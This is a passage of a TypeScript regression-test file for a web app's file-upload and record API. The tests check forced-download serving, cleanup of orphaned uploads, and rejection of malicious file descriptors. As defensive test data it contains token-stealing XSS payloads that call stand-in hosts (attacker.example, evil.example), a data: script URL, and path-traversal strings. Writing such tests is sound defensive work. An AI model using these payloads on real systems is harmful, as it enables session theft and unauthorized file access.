          fields: [
            { name: "name", type: "text", required: true },
            { name: "resume", type: "file", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const maliciousBody = "<script>fetch('https://attacker.example/steal?t='+localStorage.getItem('forge.token'))</script>";
    const formData = new FormData();
    formData.append("file", new File([maliciousBody], "resume.html", { type: "text/html" }));
    const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    assert.equal(uploadRes.status, 200);
    const uploadBody = (await uploadRes.json()) as { file: { url: string } };

    const servedRes = await fetch(`${baseUrl}${uploadBody.file.url}`);
    assert.equal(servedRes.status, 200);
    assert.equal(await servedRes.text(), maliciousBody, "the file's own content is unaffected -- only how it's served must change");
    assert.equal(
      servedRes.headers.get("content-disposition"),
      "attachment",
      "an uploaded file must be forced to download, never rendered inline, regardless of its content type",
    );
    assert.equal(servedRes.headers.get("x-content-type-options"), "nosniff");
  });
});

/**
 * Regression test for a real disk-space leak: deleteProject (packages/db)
 * drops every data table, checkpoint, and collaborator grant, but it's a
 * pure DB-layer function with no filesystem access at all -- every file
 * ever uploaded to this project stayed on disk under
 * uploadsDir/<projectId>/... forever, under a project id that no longer
 * exists anywhere, reachable by nothing. DELETE /projects/:id now also
 * removes that whole per-project uploads directory.
 */
test("DELETE /projects/:id removes every uploaded file for that project from disk, not just its database rows", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-delete-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const formData = new FormData();
    formData.append("file", new File(["%PDF-fake"], "resume.pdf", { type: "application/pdf" }));
    const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    const { file } = (await uploadRes.json()) as { file: { url: string } };
    const filePathOnDisk = path.join(uploadsDir, file.url.replace(/^\/api\/uploads\//, ""));
    assert.ok(existsSync(filePathOnDisk), "the uploaded file must actually exist on disk before deletion");

    const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}`, { method: "DELETE", headers: authHeaders(token) });
    assert.equal(deleteRes.status, 204);

    assert.equal(existsSync(filePathOnDisk), false, "the uploaded file must be removed from disk once its project is deleted");
    assert.equal(existsSync(path.join(uploadsDir, projectId)), false, "the whole per-project uploads directory must be gone too");
  });
});

/**
 * Same leak, the account-deletion path: DELETE /auth/account loops over
 * every project the account owns and calls deleteProject for each one --
 * which, same as the single-project route above, never touched the
 * filesystem. Confirms the fix applies there too, for every owned
 * project in the loop, not just the single-project delete route.
 */
test("DELETE /auth/account removes the uploaded files for every project the deleted account owned, from disk", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-account-delete-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const formData = new FormData();
    formData.append("file", new File(["%PDF-fake"], "resume.pdf", { type: "application/pdf" }));
    const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    const { file } = (await uploadRes.json()) as { file: { url: string } };
    const filePathOnDisk = path.join(uploadsDir, file.url.replace(/^\/api\/uploads\//, ""));
    assert.ok(existsSync(filePathOnDisk));

    const deleteRes = await fetch(`${baseUrl}/api/auth/account`, { method: "DELETE", headers: authHeaders(token) });
    assert.equal(deleteRes.status, 204);

    assert.equal(existsSync(filePathOnDisk), false, "deleting the account must remove the uploaded files for every project it owned");
    assert.equal(existsSync(path.join(uploadsDir, projectId)), false);
  });
});

/**
 * Round 685: the same leak the two tests above fixed for whole-project/
 * account deletion -- confirmed, by reading the code directly, to still
 * exist on every ordinary single-record edit and delete, which is exactly
 * the real follow-up round 674's own writeup named and deliberately left
 * for later ("replacing a file field's value, or removing the field/
 * entity, each orphans one old file ... a real follow-up"). PATCH never
 * compared a file field's old value against its new one, and DELETE never
 * touched the filesystem at all -- both now clean up via the fire-and-
 * forget deleteReplacedFileFields, same latency-safety convention as
 * runAutomationsForRecordChange on the same two routes.
 *
 * This test covers the PATCH side: replacing the field's value deletes the
 * OLD file but leaves the NEW one in place, and a PATCH that never touches
 * the file field at all leaves its existing file completely alone (the
 * "happy path that must NOT delete" half of the fix, not just the "must
 * delete" half).
 */
test("PATCH .../entities/:entityName/:recordId deletes a replaced file field's OLD upload from disk, keeps the new one, and never touches the file when the field itself isn't in the PATCH body", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-patch-replace-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Applicant",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "resume", type: "file", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    async function uploadResume(contents: string) {
      const formData = new FormData();
      formData.append("file", new File([contents], "resume.pdf", { type: "application/pdf" }));
      const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      });
      return (await res.json()) as { file: { url: string; name: string; size: number; mimeType: string } };
    }
    function diskPath(url: string) {
      return path.join(uploadsDir, url.replace(/^\/api\/uploads\//, ""));
    }

    const first = await uploadResume("first-resume-contents");
    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Dana", resume: JSON.stringify(first.file) }),
    });
    const { record } = (await createRes.json()) as { record: { id: number } };
    assert.ok(existsSync(diskPath(first.file.url)), "the first uploaded file must exist on disk right after creation");

    // A PATCH that never mentions the file field at all must never touch
    // its file -- this is the fix's own "happy path", not an edge case.
    const untouchedRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/${record.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Dana Cohen" }),
    });
    assert.equal(untouchedRes.status, 200);
    await new Promise((resolve) => setTimeout(resolve, 20));
    assert.ok(existsSync(diskPath(first.file.url)), "a PATCH that doesn't touch the file field must leave its existing upload alone");

    const second = await uploadResume("second-resume-contents");
    const replaceRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/${record.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ resume: JSON.stringify(second.file) }),
    });
    assert.equal(replaceRes.status, 200);

    for (let i = 0; i < 40 && existsSync(diskPath(first.file.url)); i++) {
      await new Promise((resolve) => setTimeout(resolve, 0));
    }
    assert.equal(existsSync(diskPath(first.file.url)), false, "replacing the file field must delete the OLD upload from disk");
    assert.ok(existsSync(diskPath(second.file.url)), "the NEW upload the field now points to must still exist");
  });
});

/**
 * Round 685, PATCH-clear half: a user clicking FieldInput's own "Remove"
 * button (apps/web/src/EntityPanel.tsx) sends an empty string, not a new
 * descriptor -- confirms that counts as "replaced" too (the old file must
 * still be deleted), not just the upload-a-new-file case above.
 */
test("PATCH .../entities/:entityName/:recordId deletes a file field's upload from disk when the field is cleared to an empty value", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-patch-clear-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const formData = new FormData();
    formData.append("file", new File(["resume-contents"], "resume.pdf", { type: "application/pdf" }));
    const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    const { file } = (await uploadRes.json()) as { file: { url: string } };
    const filePathOnDisk = path.join(uploadsDir, file.url.replace(/^\/api\/uploads\//, ""));

    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ resume: JSON.stringify(file) }),
    });
    const { record } = (await createRes.json()) as { record: { id: number } };
    assert.ok(existsSync(filePathOnDisk));

    const clearRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/${record.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ resume: "" }),
    });
    assert.equal(clearRes.status, 200);

    for (let i = 0; i < 40 && existsSync(filePathOnDisk); i++) {
      await new Promise((resolve) => setTimeout(resolve, 0));
    }
    assert.equal(existsSync(filePathOnDisk), false, "clearing the file field must delete its upload from disk, not just blank the DB value");
  });
});

/**
 * Round 685, DELETE half: deleteRecord (packages/db) is a pure DB-layer
 * delete with no filesystem access -- confirmed by reading it directly --
 * so deleting a record outright left its file field's upload on disk
 * forever, unreachable from the UI the instant the record itself was gone.
 */
test("DELETE .../entities/:entityName/:recordId removes that record's uploaded file from disk, not just its database row", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-record-delete-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const formData = new FormData();
    formData.append("file", new File(["resume-contents"], "resume.pdf", { type: "application/pdf" }));
    const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    const { file } = (await uploadRes.json()) as { file: { url: string } };
    const filePathOnDisk = path.join(uploadsDir, file.url.replace(/^\/api\/uploads\//, ""));

    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ resume: JSON.stringify(file) }),
    });
    const { record } = (await createRes.json()) as { record: { id: number } };
    assert.ok(existsSync(filePathOnDisk), "the uploaded file must actually exist on disk before the record is deleted");

    const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/${record.id}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(deleteRes.status, 204);

    for (let i = 0; i < 40 && existsSync(filePathOnDisk); i++) {
      await new Promise((resolve) => setTimeout(resolve, 0));
    }
    assert.equal(existsSync(filePathOnDisk), false, "deleting the record must remove its uploaded file from disk, not just the database row");
  });
});

/**
 * Round 685, path-traversal safety: a file field's stored value used to be
 * otherwise-unvalidated client-settable JSON. Round 908 closed the write
 * path itself (coerceValue's new "file" case now rejects any url that
 * isn't this server's own `/api/uploads/<project>/<entity>/<filename>`
 * shape), so a crafted traversal url can no longer be written through the
 * normal create/update API at all -- see the dedicated round-908
 * rejection test below. This test's own concern is a layer deeper: IF a
 * traversal value is already sitting in a column regardless (legacy data
 * from before round 908, or any other path not yet audited), does
 * deleteUploadedFile still refuse to resolve it outside this exact
 * project+entity's own upload directory? Writes the crafted value with a
 * raw UPDATE, bypassing coerceValue entirely, to simulate exactly that.
 */
test("replacing/clearing a file field whose stored value is a crafted path-traversal URL never deletes anything outside that project+entity's own uploads directory", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-traversal-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    // A canary file somewhere else entirely under uploadsDir, standing in
    // for "anything a crafted value might try to reach outside this
    // project+entity's own directory".
    const canaryDir = path.join(uploadsDir, "some-other-project", "SomeEntity");
    mkdirSync(canaryDir, { recursive: true });
    const canaryPath = path.join(canaryDir, "canary.txt");
    writeFileSync(canaryPath, "do not delete me");

    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({}),
    });
    assert.equal(createRes.status, 201);
    const { record } = (await createRes.json()) as { record: { id: number } };

    // Bypasses coerceValue's new round-908 write-time guard on purpose,
    // to simulate a traversal value that is already in storage by some
    // other means than today's create/update API.
    const maliciousUrl = `/api/uploads/${projectId}/Applicant/../../some-other-project/SomeEntity/canary.txt`;
    db.prepare(`UPDATE ${quoteIdentifier(tableNameFor(projectId, "Applicant"))} SET ${quoteIdentifier("resume")} = ? WHERE id = ?`).run(
      JSON.stringify({ url: maliciousUrl, name: "x", size: 0, mimeType: "" }),
      record.id,
    );

    const clearRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/${record.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ resume: "" }),
    });
    assert.equal(clearRes.status, 200);
    await new Promise((resolve) => setTimeout(resolve, 20));

    assert.ok(existsSync(canaryPath), "a crafted file-field value must never be able to delete a file outside its own project+entity directory");
  });
});

/**
 * Round 908: a file field's stored value is an otherwise-unvalidated,
 * client-settable JSON descriptor -- nothing ties it to an actual upload,
 * since a normal record create/update call can set this field directly,
 * bypassing the real /fields/:fieldName/upload endpoint entirely.
 * EntityPanel.tsx (and codegen.ts's own duplicated twin) render this
 * descriptor's `url` as a real, clickable `<a href>`/`<img src>` with no
 * scheme check anywhere, so a crafted "javascript:..." or "data:..." url
 * stored by one collaborator would run (or phish) in whichever OTHER
 * collaborator's browser later clicks the resulting file link -- a
 * stored-XSS/session-theft primitive reachable by any editor collaborator
 * against any other collaborator or the owner. coerceValue's new "file"
 * case closes this at the one place every real record write (create or
 * update) already funnels through, by requiring the url to match this
 * server's own upload-route shape. Confirms both a scripted-scheme url
 * and a structurally-malformed descriptor are rejected with 400 at
 * creation time, and that the record is never actually written.
 */
test("creating or updating a record with a file field whose url isn't this server's own /api/uploads/... shape is rejected with 400, not silently stored", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `file-field-url-validation-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const maliciousDescriptors = [
      JSON.stringify({ url: "javascript:fetch('https://evil.example/steal?t='+localStorage.getItem('forge.token'))", name: "resume.pdf", size: 123, mimeType: "application/pdf" }),
      JSON.stringify({ url: "data:text/html,<script>alert(1)</script>", name: "resume.pdf", size: 123, mimeType: "application/pdf" }),
      JSON.stringify({ url: `/api/uploads/${projectId}/Applicant/../../other-project/OtherEntity/x.txt`, name: "resume.pdf", size: 0, mimeType: "" }),
      "not even json",
      JSON.stringify({ name: "resume.pdf" }),
    ];

    for (const resume of maliciousDescriptors) {
      const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ resume }),
      });
      assert.equal(createRes.status, 400, `expected 400 for descriptor ${resume}`);
    }

    const countRow = db.prepare(`SELECT COUNT(*) as count FROM ${quoteIdentifier(tableNameFor(projectId, "Applicant"))}`).get() as {
      count: number;
    };
    assert.equal(countRow.count, 0, "none of the rejected creates should have written a record");

    // A record with a legitimate (empty) file field can still be created
    // and then rejected the same way on a later PATCH.
    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({}),
    });
    assert.equal(createRes.status, 201);
    const { record } = (await createRes.json()) as { record: { id: number } };

    const patchRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/${record.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ resume: JSON.stringify({ url: "javascript:alert(1)", name: "x", size: 0, mimeType: "" }) }),
    });
    assert.equal(patchRes.status, 400, "a PATCH setting a scripted-scheme file url must also be rejected, not just POST");
  });
});

/**
 * Round 1210: round 908's own shape-only regex (three non-slash segments
 * after /api/uploads/) blocked the XSS primitive above, but it still
 * accepted ANY other project's own real, well-formed upload URL verbatim
 * -- a genuinely different hazard the test just above never covers (every
 * one of its malicious descriptors is either a bad scheme, malformed, or
 * a traversal attempt, never a shape-valid reference to a real, unrelated
 * project). coerceValue now requires the url's own project/entity segments
 * to exactly match the record's OWN project/entity, and the filename
 * segment to actually match UPLOADED_FILENAME's real UUID shape -- not
 * just "no slashes". Every downstream reader of this same descriptor
 * (resolveUploadedFilePath/deleteUploadedFile, findTemplateFileAttachment)
 * already discards the URL's own embedded segments and rebuilds the path
 * from trusted context, so THEY were never actually exploitable this way
 * -- but /api/uploads is a plain, unauthenticated express.static route
 * with no project-ownership check of its own, and EntityPanel.tsx renders
 * this descriptor's url completely verbatim with no equivalent
 * rebuild-from-trusted-context step, so a crafted reference to some other
 * real project's real file would have been silently served to every
 * collaborator of THIS project who opens the record and clicks the link.
 */
test("creating or updating a record with a file field whose url shape-matches /api/uploads/... but names a DIFFERENT project/entity is rejected with 400, not silently stored", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `file-field-cross-project-url-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const otherProjectId = randomUUID();
    const realUuidFilename = `${randomUUID()}.pdf`;
    const crossProjectDescriptors = [
      // A real, well-formed UUID filename, but under a DIFFERENT project id.
      JSON.stringify({ url: `/api/uploads/${otherProjectId}/Applicant/${realUuidFilename}`, name: "resume.pdf", size: 123, mimeType: "application/pdf" }),
      // The correct project, but a DIFFERENT entity's own upload directory.
      JSON.stringify({ url: `/api/uploads/${projectId}/OtherEntity/${realUuidFilename}`, name: "resume.pdf", size: 123, mimeType: "application/pdf" }),
      // The correct project AND entity, but a filename that isn't a real
      // UUID shape at all (shape-only would have accepted this too).
      JSON.stringify({ url: `/api/uploads/${projectId}/Applicant/not-a-real-upload.pdf`, name: "resume.pdf", size: 123, mimeType: "application/pdf" }),
    ];

    for (const resume of crossProjectDescriptors) {
      const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ resume }),
      });
      assert.equal(createRes.status, 400, `expected 400 for cross-project/cross-entity/non-UUID descriptor ${resume}`);
    }

    const countRow = db.prepare(`SELECT COUNT(*) as count FROM ${quoteIdentifier(tableNameFor(projectId, "Applicant"))}`).get() as {
      count: number;
    };
    assert.equal(countRow.count, 0, "none of the rejected creates should have written a record");

    // The identical, real-looking UUID filename -- but under THIS record's
    // own real project and entity -- must still be accepted, confirming
    // the fix rejects by MISMATCH, not by the mere presence of a real
    // UUID filename anywhere in the url.
    const legitDescriptor = JSON.stringify({ url: `/api/uploads/${projectId}/Applicant/${realUuidFilename}`, name: "resume.pdf", size: 123, mimeType: "application/pdf" });
    const legitRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ resume: legitDescriptor }),
    });
    assert.equal(legitRes.status, 201, "the identical filename under this record's own real project/entity must still be accepted");
  });
});

/**
 * Round 1211: findEntity resolves `:entityName` case-insensitively
 * (round 1162's own fallback) -- a real, demonstrated occurrence after a
 * case-only entity rename, or simply a stale client sending the
 * pre-rename casing. POST .../fields/:fieldName/upload used the RAW
 * req.params.entityName (not the resolved entity's own canonical name)
 * for both multer's own disk-storage destination and the returned file
 * descriptor's url -- internally consistent with itself, but not with
 * every downstream consumer of that same descriptor: coerceValue's
 * round-1210 fix (packages/db/src/repository.ts) requires the stored url
 * to exactly match the record's own canonical entity.name, so uploading
 * through a differently-cased but still-resolving url and then saving
 * that exact descriptor into a record used to be rejected outright --
 * a completely legitimate upload, made through this exact server's own
 * upload route for this exact project/entity, with no way to recover
 * short of guessing the right casing on a re-upload.
 */
test("uploading through a differently-cased but still-resolving :entityName returns a url cased to match the entity's own canonical name, and that descriptor is accepted when saved into a record", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-entity-case-mismatch-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const formData = new FormData();
    formData.append("file", new File(["%PDF-fake"], "resume.pdf", { type: "application/pdf" }));
    // Lowercase "applicant" in the URL -- still resolves to the real
    // "Applicant" entity via findEntity's own case-insensitive fallback.
    const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/applicant/fields/resume/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    assert.equal(uploadRes.status, 200);
    const { file } = (await uploadRes.json()) as { file: { url: string; name: string; size: number; mimeType: string } };
    assert.match(file.url, new RegExp(`^/api/uploads/${projectId}/Applicant/[^/]+\\.pdf$`), "the returned url must be cased to match the entity's own canonical name, not the lowercase url segment the request used");

    const filePathOnDisk = path.join(uploadsDir, file.url.replace(/^\/api\/uploads\//, ""));
    assert.ok(existsSync(filePathOnDisk), "the file must physically exist at the same canonically-cased path the returned url names");

    // Saving that exact descriptor into a record (through the entity's
    // own canonical casing, as the live UI always does) must succeed --
    // round 1210's own stricter coerceValue check would have rejected it
    // before this round's fix, since the url's own project/entity
    // segments must exactly match the record's real project/entity.
    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ resume: JSON.stringify(file) }),
    });
    assert.equal(createRes.status, 201, "a record save using the upload route's own returned descriptor must be accepted, not rejected as an invalid file reference");
  });
});

/**
 * Field-type validation (and project-access validation) runs in its own
 * middleware BEFORE multer's disk-storage middleware (see the route's own
 * comment in routes/projects.ts) -- specifically so a rejected upload
 * never gets a chance to write anything to disk first. Picks a plain
 * text field to upload against, and confirms both the clear 400 and that
 * nothing landed in the project's upload directory at all.
 */
test("uploading to a field that isn't type 'file' is rejected before anything is written to disk", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `upload-wrong-field-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "name", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const formData = new FormData();
    formData.append("file", new File(["irrelevant"], "x.txt", { type: "text/plain" }));
    const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/name/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    assert.equal(res.status, 400);
    const body = (await res.json()) as { code: string };
    assert.equal(body.code, "NOT_A_FILE_FIELD");
  });
});

/**
 * Round 848's finding: EntitySchema's own `name` has no character-set
 * restriction, and migrate.ts's own tableNameFor SANITIZES an unsafe name
 * for the SQL table it creates (replacing every non-alphanumeric
 * character with "_") rather than rejecting the build outright -- so a
 * project with an entity literally named "../../../tmp/evil" still
 * reaches status "built", with that exact unsafe string preserved
 * verbatim in project.spec. Before this fix, the upload route's own
 * destination directory was built directly from entity.name with no
 * equivalent sanitization or containment check: path.join(uploadsDir,
 * projectId, entityName) resolved clean outside uploadsDir entirely, and
 * multer would then write the attacker's uploaded file wherever that
 * resolved to -- a server-side arbitrary-file-write primitive. Mirrors
 * round 685's own path-traversal test for the READ/delete side
 * (deleteUploadedFile), but for the WRITE/upload destination side, which
 * had no equivalent guard at all. encodeURIComponent is what lets a "/"
 * reach the server as a literal "/" in req.params.entityName in the first
 * place (the same mechanism rounds 552/847 rely on to send a legitimate
 * entity name containing one) -- Express decodes a %2F inside a single
 * path segment back to "/" before any handler runs.
 */
test("uploading a file for an entity whose own name is a path-traversal attempt is rejected, and nothing is written outside uploadsDir", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-entity-traversal-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const unsafeEntityName = "../../../tmp/evil";
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: unsafeEntityName, fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const canaryPath = path.join(tmpdir(), "evil", "canary-should-never-exist.txt");
    assert.equal(existsSync(canaryPath), false, "sanity check: nothing must already exist at the attempted escape target");

    const formData = new FormData();
    formData.append("file", new File(["attacker-controlled content"], "x.txt", { type: "text/plain" }));
    const res = await fetch(
      `${baseUrl}/api/projects/${projectId}/entities/${encodeURIComponent(unsafeEntityName)}/fields/resume/upload`,
      {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      },
    );
    assert.equal(res.status, 400, "the upload must be rejected, not silently written outside uploadsDir");
    const body = (await res.json()) as { code: string };
    assert.equal(body.code, "UNSAFE_ENTITY_NAME");

    assert.equal(
      existsSync(path.join(tmpdir(), "evil")),
      false,
      "the attacker's traversal target directory must never have been created at all",
    );
    assert.equal(existsSync(path.join(uploadsDir, projectId)), false, "nothing must have been written under uploadsDir either, since the request was rejected before multer ran");
  });
});

/**
 * Round 849's finding: deleteUploadedFile (the per-record cleanup that
 * runs on a PATCH that replaces/clears a file field, or a DELETE of the
 * record) builds the identical kind of path from the identical
 * unrestricted entity.name string the upload-destination side above was
 * just fixed for, but had no equivalent containment check at all -- this
 * function's own doc comment previously (wrongly) claimed it "can never
 * escape uploadsDir" specifically because the project/entity directory
 * segments were "already-authorized", the same assumption round 848
 * proved false. A file field's stored value used to be otherwise-
 * unvalidated, client-settable JSON; round 908 closed that write path
 * (coerceValue's new "file" case rejects anything that isn't this
 * server's own `/api/uploads/<project>/<entity>/<filename>` shape), so a
 * bare-filename value like this test's own canary can no longer be
 * written through the normal create/update API -- the value is injected
 * with a raw UPDATE below instead, to keep testing this deeper concern:
 * an entity named with a traversal sequence plus a crafted file-field
 * value naming any UUID-shaped filename already in storage (legacy data,
 * or any other path not yet audited) -- not necessarily one this server
 * ever actually wrote -- must still never turn a PATCH/DELETE into an
 * arbitrary single-file-delete primitive. Mirrors round 685's own
